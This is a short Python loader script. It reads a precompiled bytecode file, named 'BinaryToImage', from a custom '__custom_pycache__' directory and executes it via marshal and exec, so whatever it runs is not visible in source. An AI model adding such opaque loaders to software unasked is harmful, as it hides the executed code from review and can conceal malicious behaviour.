
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_972b8458e43f4970a3ac87b81c2a169b.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
